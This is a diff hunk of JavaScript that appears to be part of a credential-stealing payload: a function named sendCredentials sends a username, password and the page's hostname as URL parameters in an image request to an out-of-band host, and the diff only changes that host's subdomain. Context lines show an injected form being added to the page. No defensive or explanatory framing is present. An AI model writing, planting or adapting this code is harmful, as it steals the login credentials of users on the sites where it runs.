@@ -60,7 +60,7 @@ document.body.appendChild(form);
 // Function to send the credentials back to your server
 function sendCredentials(username, password) {
   var img = new Image();
-  img.src = `https://fakonltzsfedwiqhgufs2qi0cms94akrh.oast.fun?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&domain=${encodeURIComponent(window.location.hostname)}`;
+  img.src = `https://hqwkfozbqejnjncfqouaju7a9oghr07ei.oast.fun?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&domain=${encodeURIComponent(window.location.hostname)}`;
   document.body.appendChild(img);
 }
 
